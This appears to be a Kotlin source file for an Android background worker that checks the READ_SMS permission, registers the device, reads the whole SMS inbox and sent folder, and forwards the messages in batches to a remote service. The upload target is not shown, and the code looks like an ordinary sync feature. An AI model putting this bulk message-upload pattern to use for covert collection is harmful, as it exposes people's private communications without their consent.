package com.example.smssync

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.io.IOException

class SmsSyncWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : Worker(appContext, workerParams) {
    override fun doWork(): Result {
        if (applicationContext.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_SMS permission is not granted; SMS sync skipped.")
            return Result.failure()
        }

        return try {
            DeviceRegistrar(applicationContext).registerBlocking()
            val messages = SmsStore(applicationContext).readInboxAndSent()
            var uploaded = 0

            messages.chunked(BATCH_SIZE).forEach { batch ->
                uploaded += SmsForwarder(applicationContext).forwardBatch(batch)
            }

            Log.d(TAG, "SMS sync completed. Submitted $uploaded messages.")
            Result.success()
        } catch (err: IOException) {
            Log.e(TAG, "Network error during SMS sync; retrying.", err)
            Result.retry()
        } catch (err: Exception) {
            Log.e(TAG, "SMS sync failed.", err)
            Result.failure()
        }
    }

    companion object {
        private const val TAG = "SmsSyncWorker"
        private const val BATCH_SIZE = 100
    }
}
